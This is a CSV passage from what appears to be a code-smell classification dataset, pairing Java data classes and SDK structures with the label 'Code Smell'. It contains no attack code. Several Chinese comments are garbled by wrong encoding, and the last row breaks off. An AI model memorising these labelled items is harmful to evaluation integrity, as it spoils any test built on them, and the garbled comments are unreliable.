text,label,text_label
"public class AdHocSubProcess extends SubProcess {
  private Expression completionCondition;
  private Boolean cancelRemainingInstances;
  private AdHocOrdering ordering;
  public Expression getCompletionCondition(){
    return completionCondition;
  }
  public void setCompletionCondition(  Expression completionCondition){
    this.completionCondition=completionCondition;
  }
  public Boolean getCancelRemainingInstances(){
    return cancelRemainingInstances;
  }
  public void setCancelRemainingInstances(  Boolean cancelRemainingInstances){
    this.cancelRemainingInstances=cancelRemainingInstances;
  }
  public AdHocOrdering getOrdering(){
    return ordering;
  }
  public void setOrdering(  AdHocOrdering ordering){
    this.ordering=ordering;
  }
}
",1,Code Smell
"/** 
 * Settings passed to the decoder by WebRTC. 
 */
public class Settings {
  public final int numberOfCores;
  public final int width;
  public final int height;
  @CalledByNative(""Settings"") public Settings(  int numberOfCores,  int width,  int height){
    this.numberOfCores=numberOfCores;
    this.width=width;
    this.height=height;
  }
}
/** 
 * Settings passed to the encoder by WebRTC. 
 */
public class Settings {
  public final int numberOfCores;
  public final int width;
  public final int height;
  public final int startBitrate;
  public final int maxFramerate;
  public final int numberOfSimulcastStreams;
  public final boolean automaticResizeOn;
  public final Capabilities capabilities;
  @Deprecated public Settings(  int numberOfCores,  int width,  int height,  int startBitrate,  int maxFramerate,  int numberOfSimulcastStreams,  boolean automaticResizeOn){
    this(numberOfCores,width,height,startBitrate,maxFramerate,numberOfSimulcastStreams,automaticResizeOn,new VideoEncoder.Capabilities(false));
  }
  @CalledByNative(""Settings"") public Settings(  int numberOfCores,  int width,  int height,  int startBitrate,  int maxFramerate,  int numberOfSimulcastStreams,  boolean automaticResizeOn,  Capabilities capabilities){
    this.numberOfCores=numberOfCores;
    this.width=width;
    this.height=height;
    this.startBitrate=startBitrate;
    this.maxFramerate=maxFramerate;
    this.numberOfSimulcastStreams=numberOfSimulcastStreams;
    this.automaticResizeOn=automaticResizeOn;
    this.capabilities=capabilities;
  }
}
",1,Code Smell
"public static class NET_DVR_FILECOND extends Structure {
  public int lChannel;
  public int dwFileType;
  public int dwIsLocked;
  public int dwUseCardNo;
  public byte[] sCardNumber=new byte[32];
  public NET_DVR_TIME struStartTime;
  public NET_DVR_TIME struStopTime;
}",1,Code Smell
"/** 
 * @author 251823
 * @description 瀹㈡祦閲忕粺璁D
 * @date 2021/01/11
 */
public class CFG_NUMBERSTAT_MULT_INFO extends NetSDKLib.SdkStructure {
  /** 
 * 鏈�澶ц繑鍥炶鍒欎釜鏁�
 */
  public int nMaxRules;
  /** 
 * 闅愯棌閮ㄥ垎鍙傛暟閰嶇疆浣胯兘 true-瀵逛簬StereoNumber/NumberStat绠楁硶澶х被锛岄殣钘廠tereoCalibrate鏍囧畾閰嶇疆鍜岃鍒欑殑MaxHeight/MinHeight
 */
  public int bHiddenDetailEnable;
  /** 
 * 鐩告満绫诲瀷锛�0锛氳〃绀鸿�佸崟鐩娴� 1锛氳〃绀烘柊缁熶竴鍗曠洰瀹㈡祦 2锛氳〃绀烘柊缁熶竴鍙岀洰瀹㈡祦
 */
  public int nCameraType;
  /** 
 * 鏀寔鐨勪簨浠剁被鍨嬭鍒欎釜鏁�
 */
  public int nMaxSupportedRulesNum;
  /** 
 * 鏀寔鐨勪簨浠剁被鍨嬭鍒欏垪琛紝浜嬩欢绫诲瀷锛岃瑙乨hnetsdk.h涓�""鏅鸿兘鍒嗘瀽浜嬩欢绫诲瀷""
 */
  public CFG_SUPPORTED_RULES_INFO[] stuSupportedRules=(CFG_SUPPORTED_RULES_INFO[])new CFG_SUPPORTED_RULES_INFO().toArray(NetSDKLib.MAX_RULE_LIST_SIZE);
  public CFG_NUMBERSTAT_MULT_INFO(){
    for (int i=0; i < stuSupportedRules.length; i++) {
      stuSupportedRules[i]=new CFG_SUPPORTED_RULES_INFO();
    }
  }
}",1,Code Smell
"/** 
 * 绗笁鏂瑰敭鍚庡崟鍟嗗搧
 * @author lzh 2022-04-20 16:30:29
 */
@ApiModel(""绗笁鏂瑰敭鍚庡崟鍟嗗搧"") @VersionAudit @ModifyAudit @JsonInclude(value=JsonInclude.Include.NON_NULL) @Table(name=""sord_third_party_after_sale_item"") @Data public class ThirdPartyAfterSaleItem extends AuditDomain {
  public static final String FIELD_ID=""id"";
  public static final String FIELD_OUT_REFUND_NO=""outRefundNo"";
  public static final String FIELD_OUTER_ORDER_NO=""outerOrderNo"";
  public static final String FIELD_TYPE=""type"";
  public static final String FIELD_SPU_CODE=""spuCode"";
  public static final String FIELD_SKU_CODE=""skuCode"";
  public static final String FIELD_SKU_NAME=""skuName"";
  public static final String FIELD_SPU_NAME=""spuName"";
  public static final String FIELD_OUTER_SALE_PRICE=""outerSalePrice"";
  public static final String FIELD_QUANTITY=""quantity"";
  public static final String FIELD_TOTAL_AMOUNT=""totalAmount"";
  @ApiModelProperty(""涓婚敭id"") @Id @GeneratedValue private Long id;
  @ApiModelProperty(value=""绗笁鏂归��璐у崟鍙�"") private String outRefundNo;
  @ApiModelProperty(value=""涓夋柟璁㈠崟鍙�"") private String outerOrderNo;
  @ApiModelProperty(value=""鍞悗绫诲瀷 1-涓夋柟閫�娆惧崟  2- 涓夋柟閫�璐ч��娆惧崟"") private String type;
  @ApiModelProperty(value=""鍟嗗搧缂栫爜"") private String spuCode;
  @ApiModelProperty(value=""SKU缂栫爜"") private String skuCode;
  @ApiModelProperty(value=""SKU鍚嶇О"") private String skuName;
  @ApiModelProperty(value=""spu鍚嶇О"") private String spuName;
  @ApiModelProperty(value=""涓夋柟閿�鍞崟浠�"") private BigDecimal outerSalePrice;
  @ApiModelProperty(value=""鏁伴噺"") private Long quantity;
  @ApiModelProperty(value=""閫�娆炬�婚噾棰�"") private BigDecimal totalAmount;
  @ApiModelProperty(value=""skuId"") private Long skuId;
  @ApiModelProperty(value=""鍟嗗搧绫诲瀷1.瀹炵墿2铏氭嫙"") private Integer spuType;
  @ApiModelProperty(value=""璧犲搧鏍囪瘑锛�0-鍗栧搧锛�1-璧犲搧"") private Integer giftFlag;
  @ApiModelProperty(value=""鍐呴儴璁㈠崟鍙�"") private String innerOrderNo;
}",1,Code Smell
"/** 
 * 淇敼璇剧▼璁板綍 鍏ュ弬鎸囬拡  {@link NetSDKLib#CLIENT_ModifyCourse}
 * @author 锛� 47040
 * @since 锛� Created in 2020/9/17 16:37
 */
public class NET_IN_MODIFY_COURSE extends NetSDKLib.SdkStructure {
  /** 
 * 缁撴瀯浣撳ぇ灏�
 */
  public int dwSize;
  /** 
 * 璇剧▼鏁伴噺
 */
  public int nCourseNum;
  /** 
 * 璇剧▼淇℃伅
 */
  public NET_COURSE[] stuCourseInfo=new NET_COURSE[64];
  /** 
 * 璇剧▼ID
 */
  public int[] nId=new int[64];
  public NET_IN_MODIFY_COURSE(){
    dwSize=this.size();
    for (int i=0; i < stuCourseInfo.length; i++) {
      stuCourseInfo[i]=new NET_COURSE();
    }
  }
}",1,Code Smell
"/** 
 * 绫籘empAttachMetaOption.java鐨勫疄鐜版弿杩帮細TODO 绫诲疄鐜版弿杩
 * @author lei.yaol 2011-12-27 涓嬪崍03:43:32
 */
public class TempAttachMetaOption implements Serializable {
  private static final long serialVersionUID=-8786217160252057362L;
  private Integer id;
  private String name;
  private String path;
  public Integer getId(){
    return id;
  }
  public void setId(  Integer id){
    this.id=id;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public String getPath(){
    return path;
  }
  public void setPath(  String path){
    this.path=path;
  }
}",1,Code Smell
"@Table(value=""tb_idcard"") public class IDCard implements Serializable {
  private Long accountId;
  private String cardNo;
  private String content;
  public Long getAccountId(){
    return accountId;
  }
  public void setAccountId(  Long accountId){
    this.accountId=accountId;
  }
  public String getCardNo(){
    return cardNo;
  }
  public void setCardNo(  String cardNo){
    this.cardNo=cardNo;
  }
  public String getContent(){
    return content;
  }
  public void setContent(  String content){
    this.content=content;
  }
  @Override public String toString(){
    return ""IDCard{"" + ""accountId="" + accountId + "", cardNo='""+ cardNo+ '\''+ "", content='""+ content+ '\''+ '}';
  }
}
",1,Code Smell
"public static class RecommendBean {
  private long id=0L;
  private String name="""";
  public long getId(){
    return id;
  }
  public void setId(  long id){
    this.id=id;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
}",1,Code Smell
"/** 
 * DS-6001D/F(end)
 */
public static class NET_DVR_SHOWSTRINGINFO extends Structure {
  public short wShowString;
  public short wStringSize;
  public short wShowStringTopLeftX;
  public short wShowStringTopLeftY;
  public byte[] sString=new byte[44];
}",1,Code Smell
"public class ViewType {
  public static final int RECT=0;
  public static final int OVAL=1;
  public static final int LIST=2;
}
public class ViewType {
  public static final int RECT=0;
  public static final int OVAL=1;
  public static final int LIST=2;
  public static final int GRID=3;
  public static final int HORI=0;
  public static final int VERT=1;
  public static final int DARK=0;
  public static final int LIGHT=1;
}",1,Code Smell
"public static class CAPTURE_SIZE extends SdkStructure {
  public static final int CAPTURE_SIZE_D1=0;
  public static final int CAPTURE_SIZE_HD1=1;
  public static final int CAPTURE_SIZE_BCIF=2;
  public static final int CAPTURE_SIZE_CIF=3;
  public static final int CAPTURE_SIZE_QCIF=4;
  public static final int CAPTURE_SIZE_VGA=5;
  public static final int CAPTURE_SIZE_QVGA=6;
  public static final int CAPTURE_SIZE_SVCD=7;
  public static final int CAPTURE_SIZE_QQVGA=8;
  public static final int CAPTURE_SIZE_SVGA=9;
  public static final int CAPTURE_SIZE_XVGA=10;
  public static final int CAPTURE_SIZE_WXGA=11;
  public static final int CAPTURE_SIZE_SXGA=12;
  public static final int CAPTURE_SIZE_WSXGA=13;
  public static final int CAPTURE_SIZE_UXGA=14;
  public static final int CAPTURE_SIZE_WUXGA=15;
  public static final int CAPTURE_SIZE_LTF=16;
  public static final int CAPTURE_SIZE_720=17;
  public static final int CAPTURE_SIZE_1080=18;
  public static final int CAPTURE_SIZE_1_3M=19;
  public static final int CAPTURE_SIZE_2M=20;
  public static final int CAPTURE_SIZE_5M=21;
  public static final int CAPTURE_SIZE_3M=22;
  public static final int CAPTURE_SIZE_5_0M=23;
  public static final int CPTRUTE_SIZE_1_2M=24;
  public static final int CPTRUTE_SIZE_1408_1024=25;
  public static final int CPTRUTE_SIZE_8M=26;
  public static final int CPTRUTE_SIZE_2560_1920=27;
  public static final int CAPTURE_SIZE_960H=28;
  public static final int CAPTURE_SIZE_960_720=29;
  public static final int CAPTURE_SIZE_NHD=30;
  public static final int CAPTURE_SIZE_QNHD=31;
  public static final int CAPTURE_SIZE_QQNHD=32;
  public static final int CAPTURE_SIZE_960_540=33;
  public static final int CAPTURE_SIZE_640_352=34;
  public static final int CAPTURE_SIZE_640_400=35;
  public static final int CAPTURE_SIZE_320_192=36;
  public static final int CAPTURE_SIZE_320_176=37;
  public static final int CAPTURE_SIZE_SVGA1=38;
  public static final int CAPTURE_SIZE_NR=255;
}",1,Code Smell
"/** 
 * Entity mapped to table ""DOWNLOAD_LABELS"".
 */
@Entity(nameInDb=""DOWNLOAD_LABELS"") public class DownloadLabel {
  @Id private Long id;
  private String label;
  private long time;
  @Generated public DownloadLabel(){
  }
  public DownloadLabel(  Long id){
    this.id=id;
  }
  @Generated public DownloadLabel(  Long id,  String label,  long time){
    this.id=id;
    this.label=label;
    this.time=time;
  }
  public Long getId(){
    return id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public String getLabel(){
    return label;
  }
  public void setLabel(  String label){
    this.label=label;
  }
  public long getTime(){
    return time;
  }
  public void setTime(  long time){
    this.time=time;
  }
}
",1,Code Smell
"public static class NET_DELIVERY_FILE_INFO extends SdkStructure {
  public int emFileType;
  public byte[] szFileURL=new byte[DELIVERY_FILE_URL_LEN];
  public int nImageSustain;
  public int emPlayWithMode;
  public byte[] byReserved=new byte[1020];
}",1,Code Smell
"/** 
 * Descriptor for data being loaded or selected by a media source. 
 */
final class MediaLoadData {
  /** 
 * One of the  {@link C} {@code DATA_TYPE_*} constants defining the type of data. 
 */
  public final int dataType;
  /** 
 * One of the  {@link C} {@code TRACK_TYPE_*} constants if the data corresponds to media of aspecific type.  {@link C#TRACK_TYPE_UNKNOWN} otherwise.
 */
  public final int trackType;
  /** 
 * The format of the track to which the data belongs. Null if the data does not belong to a specific track.
 */
  public final @Nullable Format trackFormat;
  /** 
 * One of the  {@link C} {@code SELECTION_REASON_*} constants if the data belongs to a track.{@link C#SELECTION_REASON_UNKNOWN} otherwise.
 */
  public final int trackSelectionReason;
  /** 
 * Optional data associated with the selection of the track to which the data belongs. Null if the data does not belong to a track.
 */
  public final @Nullable Object trackSelectionData;
  /** 
 * The start time of the media, or  {@link C#TIME_UNSET} if the data does not belong to aspecific media period.
 */
  public final long mediaStartTimeMs;
  /** 
 * The end time of the media, or  {@link C#TIME_UNSET} if the data does not belong to a specificmedia period or the end time is unknown.
 */
  public final long mediaEndTimeMs;
  /** 
 * Creates media load data.
 * @param dataType One of the {@link C} {@code DATA_TYPE_*} constants defining the type of data.
 * @param trackType One of the {@link C} {@code TRACK_TYPE_*} constants if the data correspondsto media of a specific type.  {@link C#TRACK_TYPE_UNKNOWN} otherwise.
 * @param trackFormat The format of the track to which the data belongs. Null if the data doesnot belong to a track.
 * @param trackSelectionReason One of the {@link C} {@code SELECTION_REASON_*} constants if thedata belongs to a track.  {@link C#SELECTION_REASON_UNKNOWN} otherwise.
 * @param trackSelectionData Optional data associated with the selection of the track to whichthe data belongs. Null if the data does not belong to a track.
 * @param mediaStartTimeMs The start time of the media, or {@link C#TIME_UNSET} if the data doesnot belong to a specific media period.
 * @param mediaEndTimeMs The end time of the media, or {@link C#TIME_UNSET} if the data does notbelong to a specific media period or the end time is unknown.
 */
  public MediaLoadData(  int dataType,  int trackType,  @Nullable Format trackFormat,  int trackSelectionReason,  @Nullable Object trackSelectionData,  long mediaStartTimeMs,  long mediaEndTimeMs){
    this.dataType=dataType;
    this.trackType=trackType;
    this.trackFormat=trackFormat;
    this.trackSelectionReason=trackSelectionReason;
    this.trackSelectionData=trackSelectionData;
    this.mediaStartTimeMs=mediaStartTimeMs;
    this.mediaEndTimeMs=mediaEndTimeMs;
  }
}
",1,Code Smell
"public static class NET_DVR_FILECOND_V40 extends Structure {
  public int lChannel;
  public int dwFileType;
  public int dwIsLocked;
  public int dwUseCardNo;
  public byte[] sCardNumber=new byte[CARDNUM_LEN_OUT];
  public NET_DVR_TIME struStartTime=new NET_DVR_TIME();
  public NET_DVR_TIME struStopTime=new NET_DVR_TIME();
  public byte byDrawFrame;
  public byte byFindType;
  public byte byQuickSearch;
  public byte bySpecialFindInfoType;
  public int dwVolumeNum;
  public byte[] byWorkingDeviceGUID=new byte[GUID_LEN];
  public NET_DVR_SPECIAL_FINDINFO_UNION uSpecialFindInfo=new NET_DVR_SPECIAL_FINDINFO_UNION();
  public byte byStreamType;
  public byte byAudioFile;
  public byte[] byRes2=new byte[30];
}",1,Code Smell
"public static class Bean {
  private int id;
  public Item item;
  public int getId(){
    return id;
  }
  public void setId(  int id){
    this.id=id;
  }
}
public static class Bean {
  private long id;
  public Item item;
  public float value;
  public long getId(){
    return id;
  }
  public void setId(  long id){
    this.id=id;
  }
  public float getValue(){
    return value;
  }
  public void setValue(  float value){
    this.value=value;
  }
}
static class Bean {
  int f0;
  int f1;
  int[] f2;
  int f3;
  public Bean(  int f0,  int f1,  int[] f2,  int f3){
    this.f0=f0;
    this.f1=f1;
    this.f2=f2;
    this.f3=f3;
  }
  public int getF0(){
    return f0;
  }
  public int getF1(){
    return f1;
  }
  public int[] getF2(){
    return f2;
  }
  public int getF3(){
    return f3;
  }
}
public static class Bean {
  public String k1;
  public String k2;
  public String k3;
}",1,Code Smell
"public class Role implements Serializable {
  private String id;
  private String name;
  private String description;
  private String type;
  private Long createTime;
  private Long updateTime;
  private static final long serialVersionUID=1L;
  public String getId(){
    return id;
  }
  public void setId(  String id){
    this.id=id;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public String getDescription(){
    return description;
  }
  public void setDescription(  String description){
    this.description=description;
  }
  public String getType(){
    return type;
  }
  public void setType(  String type){
    this.type=type;
  }
  public Long getCreateTime(){
    return createTime;
  }
  public void setCreateTime(  Long createTime){
    this.createTime=createTime;
  }
  public Long getUpdateTime(){
    return updateTime;
  }
  public void setUpdateTime(  Long updateTime){
    this.updateTime=updateTime;
  }
}",1,Code Smell
"/** 
 * <p> </p>
 * @author fit2cloud
 * @since 2023-09-22
 */
@TableName(""visualization_linkage_field"") public class VisualizationLinkageField implements Serializable {
  private static final long serialVersionUID=1L;
  private Long id;
  /** 
 * 鑱斿姩ID
 */
  private Long linkageId;
  /** 
 * 婧愬浘琛ㄥ瓧娈
 */
  private Long sourceField;
  /** 
 * 鐩爣鍥捐〃瀛楁
 */
  private Long targetField;
  /** 
 * 鏇存柊鏃堕棿
 */
  private Long updateTime;
  private Long copyFrom;
  private Long copyId;
  public Long getId(){
    return id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public Long getLinkageId(){
    return linkageId;
  }
  public void setLinkageId(  Long linkageId){
    this.linkageId=linkageId;
  }
  public Long getSourceField(){
    return sourceField;
  }
  public void setSourceField(  Long sourceField){
    this.sourceField=sourceField;
  }
  public Long getTargetField(){
    return targetField;
  }
  public void setTargetField(  Long targetField){
    this.targetField=targetField;
  }
  public Long getUpdateTime(){
    return updateTime;
  }
  public void setUpdateTime(  Long updateTime){
    this.updateTime=updateTime;
  }
  public Long getCopyFrom(){
    return copyFrom;
  }
  public void setCopyFrom(  Long copyFrom){
    this.copyFrom=copyFrom;
  }
  public Long getCopyId(){
    return copyId;
  }
  public void setCopyId(  Long copyId){
    this.copyId=copyId;
  }
  @Override public String toString(){
    return ""VisualizationLinkageField{"" + ""id = "" + id + "", linkageId = ""+ linkageId+ "", sourceField = ""+ sourceField+ "", targetField = ""+ targetField+ "", updateTime = ""+ updateTime+ "", copyFrom = ""+ copyFrom+ "", copyId = ""+ copyId+ ""}"";
  }
}",1,Code Smell
"public static class VERSION_CODES {
  public static final int BASE=1;
  public static final int BASE_1_1=2;
  public static final int CUPCAKE=3;
  public static final int CUR_DEVELOPMENT=10000;
  public static final int DONUT=4;
  public static final int ECLAIR=5;
  public static final int ECLAIR_0_1=6;
  public static final int ECLAIR_MR1=7;
  public static final int FROYO=8;
  public static final int GINGERBREAD=9;
  public static final int GINGERBREAD_MR1=10;
  public static final int HONEYCOMB=11;
  public static final int HONEYCOMB_MR1=12;
  public static final int HONEYCOMB_MR2=13;
  public static final int ICE_CREAM_SANDWICH=14;
  public static final int ICE_CREAM_SANDWICH_MR1=15;
  public static final int JELLY_BEAN=16;
  public static final int JELLY_BEAN_MR1=17;
  public static final int JELLY_BEAN_MR2=18;
  public static final int KITKAT=19;
  public static final int KITKAT_WATCH=20;
  public static final int LOLLIPOP=21;
  public static final int LOLLIPOP_MR1=22;
  public static final int M=23;
  public static final int N=24;
  public static final int O=25;
}",1,Code Smell
"public class MySQLSelect extends SelectBase<MySQLExpression> implements MySQLExpression {
  private SelectType fromOptions=SelectType.ALL;
  private List<String> modifiers=Collections.emptyList();
  private MySQLText hint;
  public enum SelectType {  DISTINCT,   ALL,   DISTINCTROW}
  public void setSelectType(  SelectType fromOptions){
    this.setFromOptions(fromOptions);
  }
  public SelectType getFromOptions(){
    return fromOptions;
  }
  public void setFromOptions(  SelectType fromOptions){
    this.fromOptions=fromOptions;
  }
  public void setModifiers(  List<String> modifiers){
    this.modifiers=modifiers;
  }
  public List<String> getModifiers(){
    return modifiers;
  }
  @Override public MySQLConstant getExpectedValue(){
    return null;
  }
  public void setHint(  MySQLText hint){
    this.hint=hint;
  }
  public MySQLText getHint(){
    return hint;
  }
}
",1,Code Smell
"public static class ALARM_ACCESS_CTL_BREAK_IN_INFO extends SdkStructure {
  public int dwSize;
  public int nDoor;
  public byte[] szDoorName=new byte[NET_MAX_DOORNAME_LEN];
  public NET_TIME stuTime;
  public int nEventID;
  public int emMethod;
  public boolean bRealUTC;
  public NET_TIME_EX RealUTC;
  public byte[] reserved=new byte[4];
  public ALARM_ACCESS_CTL_BREAK_IN_INFO(){
    this.dwSize=this.size();
  }
}",1,Code Smell
"public static class OriginSock {
  private String identifier;
  private String local_ip;
  private int local_port;
  private String peer_ip;
  private int peer_port;
  public String getIdentifier(){
    return identifier;
  }
  public void setIdentifier(  String identifier){
    this.identifier=identifier;
  }
  public String getLocal_ip(){
    return local_ip;
  }
  public void setLocal_ip(  String local_ip){
    this.local_ip=local_ip;
  }
  public int getLocal_port(){
    return local_port;
  }
  public void setLocal_port(  int local_port){
    this.local_port=local_port;
  }
  public String getPeer_ip(){
    return peer_ip;
  }
  public void setPeer_ip(  String peer_ip){
    this.peer_ip=peer_ip;
  }
  public int getPeer_port(){
    return peer_port;
  }
  public void setPeer_port(  int peer_port){
    this.peer_port=peer_port;
  }
}
",1,Code Smell
"public class NewTernaryNode<T> implements Node<T> {
  protected final Node<T> left;
  protected final Node<T> middle;
  protected final Node<T> right;
  private final String leftStr;
  private final String rightStr;
  public NewTernaryNode(  Node<T> left,  Node<T> middle,  Node<T> right,  String leftStr,  String rightStr){
    this.left=left;
    this.middle=middle;
    this.right=right;
    this.leftStr=leftStr;
    this.rightStr=rightStr;
  }
  public Node<T> getLeft(){
    return left;
  }
  public Node<T> getMiddle(){
    return middle;
  }
  public Node<T> getRight(){
    return right;
  }
  public String getLeftStr(){
    return leftStr;
  }
  public String getRightStr(){
    return rightStr;
  }
}
",1,Code Smell
"/** 
 * Serves as the context of an analysis process. This context contains the following constructs
 */
protected static class AnalysisContext {
  private final String fieldName;
  private final FieldType fieldType;
  private final Analyzer analyzer;
  private final Set<BytesRef> termsToMatch;
  /** 
 * Constructs a new AnalysisContext with a given field tpe, analyzer and termsToMatch. By default the field name in this context will be  {@code null}. During the analysis processs, The produced tokens will be compaired to the terms in the  {@code termsToMatch} set. Whenfound, these tokens will be marked as a match.
 * @param fieldType The type of the field the analysis is performed on.
 * @param analyzer The analyzer to be used.
 * @param termsToMatch Holds all the terms that should match during the analysis process.
 */
  public AnalysisContext(  FieldType fieldType,  Analyzer analyzer,  Set<BytesRef> termsToMatch){
    this(null,fieldType,analyzer,termsToMatch);
  }
  /** 
 * Constructs an AnalysisContext with a given field name, field type and analyzer. By default this context will hold no terms to match
 * @param fieldName The name of the field the analysis is performed on (may be {@code null}).
 * @param fieldType The type of the field the analysis is performed on.
 * @param analyzer The analyzer to be used during the analysis process.
 */
  public AnalysisContext(  String fieldName,  FieldType fieldType,  Analyzer analyzer){
    this(fieldName,fieldType,analyzer,EMPTY_BYTES_SET);
  }
  /** 
 * Constructs a new AnalysisContext with a given field tpe, analyzer and termsToMatch. During the analysis processs, The produced tokens will be compared to the terms in the  {@code termsToMatch} set. When found, these tokens will be marked as a match.
 * @param fieldName The name of the field the analysis is performed on (may be {@code null}).
 * @param fieldType The type of the field the analysis is performed on.
 * @param analyzer The analyzer to be used.
 * @param termsToMatch Holds all the terms that should match during the analysis process.
 */
  public AnalysisContext(  String fieldName,  FieldType fieldType,  Analyzer analyzer,  Set<BytesRef> termsToMatch){
    this.fieldName=fieldName;
    this.fieldType=fieldType;
    this.analyzer=analyzer;
    this.termsToMatch=termsToMatch;
  }
  public String getFieldName(){
    return fieldName;
  }
  public FieldType getFieldType(){
    return fieldType;
  }
  public Analyzer getAnalyzer(){
    return analyzer;
  }
  public Set<BytesRef> getTermsToMatch(){
    return termsToMatch;
  }
}
",1,Code Smell
"/** 
 * @author Craig Walls
 * @author Christian Tzolov
 */
public class TextReader implements DocumentReader {
  public static final String CHARSET_METADATA=""charset"";
  public static final String SOURCE_METADATA=""source"";
  /** 
 * Input resource to load the text from.
 */
  private final Resource resource;
  /** 
 * @return Character set to be used when loading data from the
 */
  private Charset charset=StandardCharsets.UTF_8;
  private Map<String,Object> customMetadata=new HashMap<>();
  public TextReader(  String resourceUrl){
    this(new DefaultResourceLoader().getResource(resourceUrl));
  }
  public TextReader(  Resource resource){
    Objects.requireNonNull(resource,""The Spring Resource must not be null"");
    this.resource=resource;
  }
  public void setCharset(  Charset charset){
    Objects.requireNonNull(charset,""The charset must not be null"");
    this.charset=charset;
  }
  public Charset getCharset(){
    return this.charset;
  }
  /** 
 * Metadata associated with all documents created by the loader.
 * @return Metadata to be assigned to the output Documents.
 */
  public Map<String,Object> getCustomMetadata(){
    return this.customMetadata;
  }
  @Override public List<Document> get(){
    try {
      String document=StreamUtils.copyToString(this.resource.getInputStream(),this.charset);
      this.customMetadata.put(CHARSET_METADATA,this.charset.name());
      this.customMetadata.put(SOURCE_METADATA,this.resource.getFilename());
      return List.of(new Document(document,this.customMetadata));
    }
 catch (    IOException e) {
      throw new RuntimeException(e);
    }
  }
}",1,Code Smell
"/** 
 * @author Geng Rong
 */
class MiniMaxParentProperties {
  private String apiKey;
  private String baseUrl;
  public String getApiKey(){
    return apiKey;
  }
  public void setApiKey(  String apiKey){
    this.apiKey=apiKey;
  }
  public String getBaseUrl(){
    return baseUrl;
  }
  public void setBaseUrl(  String baseUrl){
    this.baseUrl=baseUrl;
  }
}
",1,Code Smell
"public class CloudProjectLogWithBLOBs extends CloudProjectLog implements Serializable {
  /** 
 * This field was generated by MyBatis Generator. This field corresponds to the database column cloud_project_log.operation
 * @mbg.generated Fri Aug 11 15:18:52 CST 2023
 */
  private String operation;
  /** 
 * This field was generated by MyBatis Generator. This field corresponds to the database column cloud_project_log.output
 * @mbg.generated Fri Aug 11 15:18:52 CST 2023
 */
  private String output;
  /** 
 * This field was generated by MyBatis Generator. This field corresponds to the database table cloud_project_log
 * @mbg.generated Fri Aug 11 15:18:52 CST 2023
 */
  private static final long serialVersionUID=1L;
  /** 
 * This method was generated by MyBatis Generator. This method returns the value of the database column cloud_project_log.operation
 * @return the value of cloud_project_log.operation
 * @mbg.generated Fri Aug 11 15:18:52 CST 2023
 */
  public String getOperation(){
    return operation;
  }
  /** 
 * This method was generated by MyBatis Generator. This method sets the value of the database column cloud_project_log.operation
 * @param operation the value for cloud_project_log.operation
 * @mbg.generated Fri Aug 11 15:18:52 CST 2023
 */
  public void setOperation(  String operation){
    this.operation=operation == null ? null : operation.trim();
  }
  /** 
 * This method was generated by MyBatis Generator. This method returns the value of the database column cloud_project_log.output
 * @return the value of cloud_project_log.output
 * @mbg.generated Fri Aug 11 15:18:52 CST 2023
 */
  public String getOutput(){
    return output;
  }
  /** 
 * This method was generated by MyBatis Generator. This method sets the value of the database column cloud_project_log.output
 * @param output the value for cloud_project_log.output
 * @mbg.generated Fri Aug 11 15:18:52 CST 2023
 */
  public void setOutput(  String output){
    this.output=output == null ? null : output.trim();
  }
}",1,Code Smell
"/** 
 * Created by wenshao on 16/03/2017.
 */
public class BaseDTO implements Serializable {
  /** 
 * serialVersionUID
 */
  private static final long serialVersionUID=-1;
  /** 
 * version
 */
  private String version;
  /** 
 * is online test
 */
  private Boolean onlineTest=Boolean.FALSE;
  /** 
 * http referer
 */
  private String referer;
  public String getVersion(){
    return version;
  }
  public void setVersion(  String version){
    this.version=version;
  }
  public Boolean isOnlineTest(){
    return onlineTest;
  }
  public void setOnlineTest(  Boolean onlineTest){
    this.onlineTest=onlineTest;
  }
  public String getReferer(){
    return referer;
  }
  public void setReferer(  String referer){
    this.referer=referer;
  }
  @Override public String toString(){
    return ""BaseDTO [version="" + version + "", onlineTest=""+ onlineTest+ "", referer=""+ referer+ ""]"";
  }
}",1,Code Smell
"public static class NET_DVR_CHECK_FACE_PICTURE_CFG extends Structure {
  public int dwSize;
  public int dwPictureNo;
  public int dwPictureLen;
  public Pointer pPictureBuffer;
  public int dwFaceTemplateLen;
  public Pointer pFaceTemplateBuffer;
  public byte[] byRes=new byte[248];
}",1,Code Smell
"public static class NET_IN_RADIOMETRY_DOFIND extends SdkStructure {
  public int dwSize;
  public int nFinderHanle;
  public int nBeginNumber;
  public int nCount;
  public NET_IN_RADIOMETRY_DOFIND(){
    this.dwSize=this.size();
  }
}
",1,Code Smell
"public class CredentialType {
  public static final String ACCESS_KEY=""access_key"";
  public static final String STS=""sts"";
  public static final String ECS_RAM_ROLE=""ecs_ram_role"";
  public static final String RAM_ROLE_ARN=""ram_role_arn"";
}
",1,Code Smell
"public final class GProDirectMsgReport {
  long guildId;
  byte[] meta;
  long readCntSeq;
  long readCntTime;
  long readMsgSeq;
  long readMsgTime;
  public GProDirectMsgReport(){
    this.meta=new byte[0];
  }
  public long getGuildId(){
    return this.guildId;
  }
  public byte[] getMeta(){
    return this.meta;
  }
  public long getReadCntSeq(){
    return this.readCntSeq;
  }
  public long getReadCntTime(){
    return this.readCntTime;
  }
  public long getReadMsgSeq(){
    return this.readMsgSeq;
  }
  public long getReadMsgTime(){
    return this.readMsgTime;
  }
  public String toString(){
    return ""GProDirectMsgReport{guildId="" + this.guildId + "",readMsgSeq=""+ this.readMsgSeq+ "",readMsgTime=""+ this.readMsgTime+ "",readCntSeq=""+ this.readCntSeq+ "",readCntTime=""+ this.readCntTime+ "",meta=""+ this.meta+ "",}"";
  }
  public GProDirectMsgReport(  long j2,  long j3,  long j4,  long j5,  long j6,  byte[] bArr){
    this.meta=new byte[0];
    this.guildId=j2;
    this.readMsgSeq=j3;
    this.readMsgTime=j4;
    this.readCntSeq=j5;
    this.readCntTime=j6;
    this.meta=bArr;
  }
}",1,Code Smell
"/** 
 * @author sanyue
 * @date 2018/9/13
 */
public class KafkaWriterParam extends DaPluginParam {
  private List<String> tableFields;
  protected boolean dataSequence;
  private String topic;
  protected List<String> partitionKey;
  private Map<String,String> kafkaSettings;
  private String zookeeperConnect;
  private String bootstrapServers;
  /** 
 * json銆乼ext
 */
  private String codec;
  public List<String> getTableFields(){
    return tableFields;
  }
  public void setTableFields(  List<String> tableFields){
